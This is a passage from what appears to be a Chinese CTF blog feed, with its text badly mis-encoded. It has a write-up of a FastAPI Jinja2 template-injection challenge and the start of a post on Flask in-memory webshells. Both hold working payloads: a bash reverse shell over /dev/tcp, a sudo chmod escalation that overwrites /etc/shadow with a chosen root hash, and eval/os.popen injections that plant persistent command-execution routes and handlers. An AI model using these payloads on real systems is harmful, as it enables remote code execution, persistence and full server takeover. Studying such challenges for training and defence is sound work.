class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse, JSONResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line">Jinja2 = Environment(</span><br><span class="line">    variable_start_string=<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    variable_end_string=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_404</span>(<span class="params">request, exc</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;not found!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        status_code=<span class="number">404</span>,</span><br><span class="line">        content=&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Not found&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say1&#x27;</span>] = <span class="string">&#x27;hello!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hi</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say2&#x27;</span>] = <span class="string">&#x27;hi!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/shellMe&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">shellMe</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=<span class="string">&quot;&lt;h1&gt;Welcome!&lt;/h1&gt;&lt;p&gt;Request processed.&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_disabled</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;æ­¤è·¯ä¸é€šï¼è¯¥æ–¹æ³•å·²è¢«ç®¡ç†å‘˜ç¦ç”¨ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡å›æ˜¾ï¼Œæœ¬åœ°è°ƒæˆæœ‰å›æ˜¾çš„æ–¹ä¾¿æ‰¾ä¸œè¥¿ï¼Œæœ€åexpï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;self.<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span>TemplateReference<span class="built_in">_</span><span class="built_in">_</span>context.keys()&#125;å…ˆç”¨è¿™ä¸ªçœ‹ä¸‹æœ‰å“ªäº›å†…ç½®çš„ä¸œè¥¿å¯ä»¥ä½¿ç”¨</span><br><span class="line">ç”¨bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;å»å¼¹shell</span><br><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;&#x27;).read()&#125;æ³¨æ„urlç¼–ç ä¸€ä¸‹å°±å¥½äº†</span><br></pre></td></tr></table></figure><p>å“ˆå“ˆæ‹¿åˆ°shellä¹‹åflagå°±åœ¨è·Ÿç›®å½•ä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ï¼å…ˆçœ‹ä¸‹èƒ½ä¸èƒ½suidææƒï¼Œä½†æ˜¯æ²¡æœ‰å¥½çš„suidææƒå‘½ä»¤ï¼</p><p>sudo ææƒ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -lå‘ç°å¯ä»¥ç”¨chmodå‘½ä»¤ææƒï¼Œè¿™æ˜¯ä¸€ä¸ªè®¾ç½®æ–‡ä»¶æƒé™çš„å‘½ä»¤ï¼Œå¯¹äºè¿™é“é¢˜æ¥è¯´æˆ‘ä»¬åªéœ€è¦</span><br><span class="line">chmod 764 /flag å°±å¯ä»¥ç›´æ¥è¯»äº†</span><br><span class="line">æ‹¿ä¸‹æ•´å°æœºå­</span><br><span class="line">chmod 766 /etc/shadow</span><br><span class="line">echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /etc/shadow</span><br><span class="line">ç„¶åsu rootï¼ˆå¯†ç å°±æ˜¯æˆ‘ä»¬æ”¹çš„rootï¼‰è¿™æ ·å°±æ‹¿ä¸‹äº†</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/6.png"></p><h3 id="é¢„æœŸ-1"><a href="#é¢„æœŸ-1" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>é‚£ä¹ˆè¯´åˆ°éé¢„æœŸæ˜¯å‡ºç½‘æ‰“åå¼¹shellï¼Œé‚£ä¹ˆé¢„æœŸè‡ªç„¶å°±æ˜¯ä¸å‡ºç½‘æ‰“å†…å­˜é©¬å‘—ï¼</p><p>è¿™é‡Œå°±ä¸æ˜¯flaskæ¡†æ¶ä¸‹çš„å†…å­˜é©¬äº†ï¼Œæ˜¯FaskAPIæ¡†æ¶ï¼å‚è€ƒï¼š<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI å†…å­˜é©¬çš„ç ”ç©¶ - caterpieçš„å°ç«™</a></p><ol><li>ç»å…¸è·¯çº¿æ‰“è·¯ç”±æ·»åŠ å‡½æ•°</li><li>æ–°è·¯çº¿çš„æ¢ç©¶</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br></pre></td></tr></table></figure><p>åªèƒ½æ‰“ç¬¬äºŒç§äº†ï¼Œè¿™æ¬¡å½“å›è„šæœ¬å°å­ï¼æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œæ‰“ç®—åé¢ç ”ç©¶ä¸€ä¸‹</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.app.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadæˆ‘åœ¨æœ¬åœ°æ‰“é€šäº†ï¼Œæ”¾åˆ°è¿œç¨‹å°±æ‰“ä¸é€šäº†ï¼åé¢ä¸€æ­¥ä¸€æ­¥fuzzï¼Œå‘ç°æ˜¯ä¸­é—´ä»¶çš„é—®é¢˜ï¼Œå°±ä¸€ä¸ªapp</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>bydè¿˜æ˜¯æ‰“ä¸é€šï¼Œè¿˜æ˜¯ä¸€æ­¥æ­¥æµ‹è¯•ï¼Œå‘ç°é¢˜ç›®<code>sys.modules[&#39;__main__&#39;]</code>ä¸‹é¢æ²¡æœ‰appï¼ŒçœŸå¥‡æ€ªï¼Œéš¾é“æ˜¯baoå¸ˆå‚…æŠŠå®ƒåˆ äº†ï¼Ÿåé¢BRå¸ˆå‚…è¯´æ˜¯åœ¨appæ¨¡å—å‹æ ¹å°±ä¸åœ¨mainæ¨¡å—ï¼Œä½†æ˜¯æœ¬åœ°ä¸ºä»€ä¹ˆå¯ä»¥å‘¢ï¼Ÿ</p><p>é™„ä»¶é‡Œé¢è¿˜æœ‰ä¸ªstart.shè¢«æˆ‘å¿½ç•¥äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec uvicorn app:app --host 0.0.0.0 --port 8000</span><br></pre></td></tr></table></figure><p><code>uvicorn</code>ç”¨äºå¯åŠ¨ Uvicorn ASGI æœåŠ¡å™¨ï¼Œ<code>app:app</code>æ ¼å¼æ˜¯<code>module_name:variable_name</code></p><p>æ‰€ä»¥æœ¬è´¨ä¸Šå®ƒæ˜¯é€šè¿‡è¿™ä¸ªèµ·çš„æœåŠ¡ï¼Œæˆ‘æœ¬åœ°å°±æ˜¯è¿è¡Œpythonè„šæœ¬èµ·çš„æœåŠ¡è‡ªç„¶ä¸ä¸€æ ·</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰“é€šäº†</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™é“é¢˜è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œå¢åŠ äº†æˆ‘å¯¹sstiï¼Œåå¼¹shellï¼Œlinuxææƒï¼Œå†…å­˜é©¬çš„ç†è§£ï¼</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> fastapiå†…å­˜é©¬ </tag>
            
            <tag> sudoææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flaskä¸‹çš„å†…å­˜é©¬</title>
      <link href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><h3 id="ä»€ä¹ˆæ˜¯å†…å­˜é©¬"><a href="#ä»€ä¹ˆæ˜¯å†…å­˜é©¬" class="headerlink" title="ä»€ä¹ˆæ˜¯å†…å­˜é©¬"></a>ä»€ä¹ˆæ˜¯å†…å­˜é©¬</h3><p>å†…å­˜é©¬æ˜¯ä¸€ç§<strong>æ— æ–‡ä»¶è½åœ°</strong>çš„æ¶æ„ä»£ç ã€‚ä¸åŒäºä¼ ç»Ÿçš„webshellï¼šé€šå¸¸æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚æ”»å‡»è€…åˆ©ç”¨æŸäº›ä¸­é—´ä»¶çš„è¿›ç¨‹æ‰§è¡Œå†…å­˜é©¬ï¼Œä»è€Œè¿›è¡Œgetshellï¼</p><h3 id="flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´"><a href="#flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´" class="headerlink" title="flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´"></a>flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´</h3><p>å°±æ˜¯åˆ©ç”¨flaskçš„sstiæ¼æ´ï¼Œè¿›è¡Œæ’å…¥å†…å­˜é©¬ï¼ä¸å…¶è¯´æ˜¯flaskçš„sstiï¼Œä¸å¦‚è¯´æ˜¯jinja2çš„ï¼Œæ¨¡æ¿å¼•æ“æ˜¯jinja2ï¼</p><h2 id="æ—§é©¬ï¼ˆflask2-xï¼‰"><a href="#æ—§é©¬ï¼ˆflask2-xï¼‰" class="headerlink" title="æ—§é©¬ï¼ˆflask2.xï¼‰"></a>æ—§é©¬ï¼ˆflask2.xï¼‰</h2><h3 id="payloadåˆ†æ"><a href="#payloadåˆ†æ" class="headerlink" title="payloadåˆ†æ"></a>payloadåˆ†æ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹pyaloadè¿›è¡Œé€ä¸€åˆ†æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å…ˆå°±æ˜¯æ‰¾evalç”¨äºpythonä»£ç ï¼Œå½“ç„¶execä¹Ÿå¯ä»¥ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span></span><br></pre></td></tr></table></figure><p>appæ˜¯Flaskç±»çš„å®ä¾‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯Flaskåº”ç”¨æœ¬èº«ï¼</p><p>add_url_ruleæ˜¯Flaskæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ–¹æ³•ï¼Œç”¨äºæ‰‹åŠ¨æ·»åŠ URLè·¯ç”±è§„åˆ™ï¼</p><p>æˆ‘ä»¬é€šè¿‡è·Ÿè¿›routeè¿™ä¸ªè£…é¥°å™¨å‡½æ•°ï¼Œæ‰¾åˆ°add_url_ruleåœ¨è·Ÿè¿›å®ƒï¼Œæ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params">    </span>)</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯çœ‹ä¸‰ä¸ªå‚æ•°</p><ul><li>ruleï¼šå‡½æ•°å¯¹åº”çš„<code>URL</code>è§„åˆ™, æ»¡è¶³æ¡ä»¶å’Œ<code>app.route</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·, å¿…é¡»ä»¥<code>/</code>å¼€å¤´</li><li>endpointï¼šè·¯ç”±çš„ç«¯ç‚¹åç§°ï¼Œæ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œç”¨äºåœ¨ Flask å†…éƒ¨å¼•ç”¨è¿™ä¸ªè·¯ç”±ã€‚è¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªå‡½æ•°å</li><li>view_funcï¼šå¤„ç†è¿™ä¸ªè·¯ç”±è¯·æ±‚çš„è§†å›¾å‡½æ•°ï¼Œå½“å®¢æˆ·ç«¯è®¿é—®è¿™ä¸ªè·¯å¾„æ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</li></ul><p>æ¥ä¸‹æ¥å°±çœ‹è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°äº†</p><p>lambdaæ˜¯ä¸€ä¸ªæ— åå‡½æ•°ï¼Œ:åé¢æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ç”¨äºå®ç°å‡½æ•°çš„åŠŸèƒ½ï¼è¿™é‡Œå°±æ˜¯å¯¼å…¥å‘½ä»¤å‡½æ•°ï¼Œé‚£ä¹ˆ<code>_request_ctx_stack.top</code>è¿™ä¸ªåˆæ˜¯ä»€ä¹ˆç©æ„ï¼Ÿ</p><h4 id="flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶"><a href="#flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶" class="headerlink" title="flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶"></a>flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶</h4><blockquote><p>å½“ç½‘é¡µè¯·æ±‚è¿›å…¥<code>Flask</code>æ—¶, ä¼šå®ä¾‹åŒ–ä¸€ä¸ª<code>Request Context</code>. åœ¨<code>Python</code>ä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡: è¯·æ±‚ä¸Šä¸‹æ–‡(request context)ã€åº”ç”¨ä¸Šä¸‹æ–‡(session context). ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯, è€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ª<code>Stack</code>çš„æ ˆç»“æ„, ä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§. <code>request context</code>å®ä¾‹åŒ–åä¼šè¢«<code>push</code>åˆ°æ ˆ<code>_request_ctx_stack</code>ä¸­, åŸºäºæ­¤ç‰¹æ€§ä¾¿å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚.</p></blockquote><p>é‚£ä¹ˆè¯´ç™½äº†å°±æ˜¯è¯·æ±‚çš„å‚¨å­˜çš„ç»“æ„å¼æ ˆç»“æ„ï¼Œåè¿›å…ˆå‡ºï¼Œç„¶åé€šè¿‡<code>_request_ctx_stack.top</code>è·å–æ ˆé¡¶å…ƒç´ ä¹Ÿå°±æ˜¯æœ€æ–°è¯·æ±‚ï¼</p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±æ˜ç™½äº†</p><p><code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)</code>å°±æ˜¯è·å¾—è¯·æ±‚çš„cmdå‚æ•°ï¼Œé»˜è®¤å€¼æ˜¯whoami</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>evalçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸ªå­—å…¸ç”¨äºå£°æ˜é‡Œé¢çš„å…¨å±€å˜é‡ï¼Œç”¨æ¥æŒ‡å®š<code>exec()</code> æˆ– <code>eval()</code> çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³è¦æ‰§è¡Œçš„ä»£ç å­—ç¬¦ä¸²ï¼‰ä¸­å¼•ç”¨çš„ã€ä½†å¹¶æœªåœ¨ä»£ç å­—ç¬¦ä¸²å†…éƒ¨å®šä¹‰</strong>çš„é‚£äº›å˜é‡</p><p>åˆ°è¿™æ•´ä¸ªpyloadå°±åˆ†æå®Œäº†</p><h3 id="æœ¬åœ°test"><a href="#æœ¬åœ°test" class="headerlink" title="æœ¬åœ°test"></a>æœ¬åœ°test</h3><p>é¦–å…ˆå®‰è£…</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">pip install werkzeug==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯è¿è¡Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span 